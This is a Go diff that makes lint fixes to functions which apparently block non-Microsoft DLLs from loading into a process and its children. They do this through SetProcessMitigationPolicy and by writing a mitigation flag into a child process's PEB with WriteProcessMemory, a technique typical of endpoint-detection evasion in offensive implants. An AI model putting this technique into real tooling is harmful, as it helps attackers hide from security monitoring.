@@ -32,7 +32,7 @@ func blockDLLs() string {
 	ret, _, err := procSetProcessMitigationPolicy.Call(
 		uintptr(ProcessSignaturePolicy),
 		uintptr(unsafe.Pointer(&policy)),
-		uintptr(unsafe.Sizeof(policy)),
+		unsafe.Sizeof(policy),
 	)
 	if ret == 0 {
 		results += fmt.Sprintf("SetProcessMitigationPolicy failed: %v\n", err)
@@ -67,7 +67,7 @@ func blockDllsPEBInternal() string {
 		^uintptr(0),
 		0,
 		uintptr(unsafe.Pointer(&pbi)),
-		uintptr(unsafe.Sizeof(pbi)),
+		unsafe.Sizeof(pbi),
 		0,
 	)
 	if ret != 0 {
@@ -123,7 +123,7 @@ func applyBlockDLLsToChild(hProc uintptr) {
 		hProc,
 		0,
 		uintptr(unsafe.Pointer(&pbi)),
-		uintptr(unsafe.Sizeof(pbi)),
+		unsafe.Sizeof(pbi),
 		0,
 	)
 	if ret != 0 || pbi.PebBaseAddress == 0 {
@@ -138,5 +138,5 @@ func applyBlockDLLsToChild(hProc uintptr) {
 	flagsPtr := ppPtr + 0x70
 	var flags uint32 = 0x20
 	procWrite := kernel32Block.NewProc("WriteProcessMemory")
-	procWrite.Call(hProc, flagsPtr, uintptr(unsafe.Pointer(&flags)), uintptr(unsafe.Sizeof(flags)), 0)
+	_, _, _ = procWrite.Call(hProc, flagsPtr, uintptr(unsafe.Pointer(&flags)), unsafe.Sizeof(flags), 0)
 }
